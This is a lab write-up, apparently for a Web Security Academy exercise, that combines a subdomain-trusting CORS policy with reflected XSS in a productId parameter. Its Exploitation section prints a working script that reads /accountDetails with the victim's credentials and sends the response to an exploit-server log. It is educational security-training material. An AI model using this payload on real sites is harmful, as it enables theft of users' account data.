Following similar steps as in previous labs we find the header `Access-Control-Allow-Credentials: true` in the response of a **GET** request to `/accountDetails` page.
Next, after some testing you'll find the CORS policy only allows a requester origin coming from one of its subdomains. For e.g, `http://stock.acbd1fc51efead7380b90e29008b00b7.web-security-academy.net/?productId=1&storeId=1`

![image](https://user-images.githubusercontent.com/86168235/127906926-39982f19-93c3-4588-9e4e-bf62b07eb076.png)

After checking for vulnerable params, we find that the `productId` parameter is vulnerable to XSS. To test this, visit a product page and click on `Check stock` and intercept the request with Burp. Modify the request as follows:-

![image](https://user-images.githubusercontent.com/86168235/127907033-f8a06d1d-62ee-46c2-bb21-369f356c19a8.png)

Then `forward` the request and you'll see the classic `xss` prompt response in the browser.

![image](https://user-images.githubusercontent.com/86168235/127907176-ec249fe2-cb11-4e92-a5fc-286deaa07cab.png)


## Exploitation
Go to the exploit server and paste the following script in the `Body` box after editing the respective urls to match your lab urls.

```
<script>
   document.location="http://stock.acbd1fc51efead7380b90e29008b00b7.web-security-academy.net/?productId=1<script>const xhr = new XMLHttpRequest(), method = 'GET', url = 'https://acbd1fc51efead7380b90e29008b00b7.web-security-academy.net/accountDetails';function handler() {location='https://exploit-ac3f1fb11e9fad8a80200e44017100c1.web-security-academy.net/log?body='%2bthis.responseText; }; xhr.onload = handler; xhr.open(method, url,true); xhr.withCredentials = true;xhr.send();%3c/script>&storeId=1"
</script>
```

Then click on `Deliver exploit to victim` and check the `Access log` of the exploit server and we see the `/accountDetails` of the administrator user in access logs.

![image](https://user-images.githubusercontent.com/86168235/127907363-00318ca4-b254-4601-a9b8-e11bae7071a7.png)
